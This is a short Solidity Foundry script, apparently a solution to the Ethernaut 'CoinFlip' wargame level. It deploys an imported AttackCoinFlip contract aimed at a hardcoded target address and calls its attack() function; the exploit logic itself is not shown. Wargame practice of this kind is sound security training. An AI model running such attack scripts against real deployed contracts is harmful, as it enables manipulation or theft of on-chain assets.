//SPDX-License-Identifier: MIT
import {AttackCoinFlip} from "../src/AttackCoinFlip.sol";
import {Script, console} from "forge-std/Script.sol";

pragma solidity ^0.8.18;

contract HackCoinFlip is Script{

    address targetAddress = 0x87c9265868a2cfa3C4A2669f43a9bf9CC80A9B09;

    function run() external{
        vm.startBroadcast();
        AttackCoinFlip attackcoin_flip = new AttackCoinFlip(targetAddress);
        attackcoin_flip.attack();
        vm.stopBroadcast();
    }

}